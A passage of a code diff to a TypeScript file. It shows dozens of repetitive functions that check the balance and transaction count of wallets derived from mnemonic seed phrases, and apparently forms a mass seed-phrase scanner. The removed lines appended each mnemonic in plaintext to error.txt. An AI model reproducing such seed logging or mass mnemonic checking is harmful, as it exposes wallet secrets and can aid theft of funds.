-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s81(mnemonic: string, db: any): Promise<void> {
@@ -1368,7 +1358,7 @@ async function s81(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s82(mnemonic: string, db: any): Promise<void> {
@@ -1384,7 +1374,7 @@ async function s82(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s83(mnemonic: string, db: any): Promise<void> {
@@ -1400,7 +1390,7 @@ async function s83(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s84(mnemonic: string, db: any): Promise<void> {
@@ -1416,7 +1406,7 @@ async function s84(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s85(mnemonic: string, db: any): Promise<void> {
@@ -1432,7 +1422,7 @@ async function s85(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s86(mnemonic: string, db: any): Promise<void> {
@@ -1448,7 +1438,7 @@ async function s86(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s87(mnemonic: string, db: any): Promise<void> {
@@ -1464,7 +1454,7 @@ async function s87(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s88(mnemonic: string, db: any): Promise<void> {
@@ -1480,7 +1470,7 @@ async function s88(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s89(mnemonic: string, db: any): Promise<void> {
@@ -1496,7 +1486,7 @@ async function s89(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s90(mnemonic: string, db: any): Promise<void> {
@@ -1512,7 +1502,7 @@ async function s90(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s91(mnemonic: string, db: any): Promise<void> {
@@ -1528,7 +1518,7 @@ async function s91(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 
@@ -1545,7 +1535,7 @@ async function s92(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s93(mnemonic: string, db: any): Promise<void> {
@@ -1561,7 +1551,7 @@ async function s93(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s94(mnemonic: string, db: any): Promise<void> {
@@ -1577,7 +1567,7 @@ async function s94(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s95(mnemonic: string, db: any): Promise<void> {
@@ -1593,7 +1583,7 @@ async function s95(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s96(mnemonic: string, db: any): Promise<void> {
@@ -1609,7 +1599,7 @@ async function s96(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s97(mnemonic: string, db: any): Promise<void> {
@@ -1625,7 +1615,7 @@ async function s97(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s98(mnemonic: string, db: any): Promise<void> {
@@ -1641,7 +1631,7 @@ async function s98(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s99(mnemonic: string, db: any): Promise<void> {
@@ -1657,7 +1647,7 @@ async function s99(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s100(mnemonic: string, db: any): Promise<void> {
@@ -1673,7 +1663,7 @@ async function s100(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s101(mnemonic: string, db: any): Promise<void> {
@@ -1689,7 +1679,7 @@ async function s101(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s102(mnemonic: string, db: any): Promise<void> {
@@ -1705,7 +1695,7 @@ async function s102(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s103(mnemonic: string, db: any): Promise<void> {
@@ -1721,7 +1711,7 @@ async function s103(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s104(mnemonic: string, db: any): Promise<void> {
@@ -1737,7 +1727,7 @@ async function s104(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s105(mnemonic: string, db: any): Promise<void> {
@@ -1753,7 +1743,7 @@ async function s105(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s106(mnemonic: string, db: any): Promise<void> {
@@ -1769,7 +1759,7 @@ async function s106(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s107(mnemonic: string, db: any): Promise<void> {
@@ -1785,7 +1775,7 @@ async function s107(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s108(mnemonic: string, db: any): Promise<void> {
@@ -1801,7 +1791,7 @@ async function s108(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s109(mnemonic: string, db: any): Promise<void> {
@@ -1817,7 +1807,7 @@ async function s109(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s110(mnemonic: string, db: any): Promise<void> {
@@ -1833,7 +1823,7 @@ async function s110(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s111(mnemonic: string, db: any): Promise<void> {
@@ -1849,7 +1839,7 @@ async function s111(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s112(mnemonic: string, db: any): Promise<void> {
@@ -1865,7 +1855,7 @@ async function s112(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s113(mnemonic: string, db: any): Promise<void> {
@@ -1881,7 +1871,7 @@ async function s113(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s114(mnemonic: string, db: any): Promise<void> {
@@ -1897,7 +1887,7 @@ async function s114(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s115(mnemonic: string, db: any): Promise<void> {
@@ -1913,7 +1903,7 @@ async function s115(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s116(mnemonic: string, db: any): Promise<void> {
@@ -1929,7 +1919,7 @@ async function s116(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s117(mnemonic: string, db: any): Promise<void> {
@@ -1945,7 +1935,7 @@ async function s117(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s118(mnemonic: string, db: any): Promise<void> {
@@ -1961,7 +1951,7 @@ async function s118(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s119(mnemonic: string, db: any): Promise<void> {
@@ -1977,7 +1967,7 @@ async function s119(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s120(mnemonic: string, db: any): Promise<void> {
@@ -1993,7 +1983,7 @@ async function s120(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s121(mnemonic: string, db: any): Promise<void> {
@@ -2009,7 +1999,7 @@ async function s121(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s122(mnemonic: string, db: any): Promise<void> {
@@ -2025,7 +2015,7 @@ async function s122(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s123(mnemonic: string, db: any): Promise<void> {
@@ -2041,7 +2031,7 @@ async function s123(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s124(mnemonic: string, db: any): Promise<void> {
@@ -2057,7 +2047,7 @@ async function s124(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s125(mnemonic: string, db: any): Promise<void> {
@@ -2073,7 +2063,7 @@ async function s125(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s126(mnemonic: string, db: any): Promise<void> {
@@ -2089,7 +2079,7 @@ async function s126(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s127(mnemonic: string, db: any): Promise<void> {
@@ -2105,7 +2095,7 @@ async function s127(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s128(mnemonic: string, db: any): Promise<void> {
@@ -2121,7 +2111,7 @@ async function s128(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s129(mnemonic: string, db: any): Promise<void> {
@@ -2137,7 +2127,7 @@ async function s129(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s130(mnemonic: string, db: any): Promise<void> {
@@ -2153,7 +2143,7 @@ async function s130(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s131(mnemonic: string, db: any): Promise<void> {
@@ -2169,7 +2159,7 @@ async function s131(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s132(mnemonic: string, db: any): Promise<void> {
@@ -2185,7 +2175,7 @@ async function s132(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s133(mnemonic: string, db: any): Promise<void> {
@@ -2201,7 +2191,7 @@ async function s133(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s134(mnemonic: string, db: any): Promise<void> {
@@ -2217,7 +2207,7 @@ async function s134(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s135(mnemonic: string, db: any): Promise<void> {
@@ -2233,7 +2223,7 @@ async function s135(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s136(mnemonic: string, db: any): Promise<void> {
@@ -2249,7 +2239,7 @@ async function s136(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s137(mnemonic: string, db: any): Promise<void> {
@@ -2265,7 +2255,7 @@ async function s137(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s138(mnemonic: string, db: any): Promise<void> {
@@ -2281,7 +2271,7 @@ async function s138(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s139(mnemonic: string, db: any): Promise<void> {
@@ -2297,7 +2287,7 @@ async function s139(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s140(mnemonic: string, db: any): Promise<void> {
@@ -2313,7 +2303,7 @@ async function s140(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s141(mnemonic: string, db: any): Promise<void> {
@@ -2329,7 +2319,7 @@ async function s141(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s142(mnemonic: string, db: any): Promise<void> {
@@ -2345,7 +2335,7 @@ async function s142(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s143(mnemonic: string, db: any): Promise<void> {
@@ -2361,7 +2351,7 @@ async function s143(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s144(mnemonic: string, db: any): Promise<void> {
@@ -2377,7 +2367,7 @@ async function s144(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s145(mnemonic: string, db: any): Promise<void> {
@@ -2393,7 +2383,7 @@ async function s145(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s146(mnemonic: string, db: any): Promise<void> {
@@ -2409,7 +2399,7 @@ async function s146(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s147(mnemonic: string, db: any): Promise<void> {
@@ -2425,7 +2415,7 @@ async function s147(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s148(mnemonic: string, db: any): Promise<void> {
@@ -2441,7 +2431,7 @@ async function s148(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s149(mnemonic: string, db: any): Promise<void> {
@@ -2457,7 +2447,7 @@ async function s149(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s150(mnemonic: string, db: any): Promise<void> {
@@ -2473,7 +2463,7 @@ async function s150(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s151(mnemonic: string, db: any): Promise<void> {
@@ -2489,7 +2479,7 @@ async function s151(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s152(mnemonic: string, db: any): Promise<void> {
@@ -2505,7 +2495,7 @@ async function s152(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s153(mnemonic: string, db: any): Promise<void> {
@@ -2521,7 +2511,7 @@ async function s153(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s154(mnemonic: string, db: any): Promise<void> {
@@ -2537,7 +2527,7 @@ async function s154(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s155(mnemonic: string, db: any): Promise<void> {
@@ -2553,7 +2543,7 @@ async function s155(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s156(mnemonic: string, db: any): Promise<void> {
@@ -2569,7 +2559,7 @@ async function s156(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s157(mnemonic: string, db: any): Promise<void> {
@@ -2585,7 +2575,7 @@ async function s157(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s158(mnemonic: string, db: any): Promise<void> {
@@ -2601,7 +2591,7 @@ async function s158(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s159(mnemonic: string, db: any): Promise<void> {
@@ -2617,7 +2607,7 @@ async function s159(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s160(mnemonic: string, db: any): Promise<void> {
@@ -2633,7 +2623,7 @@ async function s160(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s161(mnemonic: string, db: any): Promise<void> {
@@ -2649,7 +2639,7 @@ async function s161(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s162(mnemonic: string, db: any): Promise<void> {
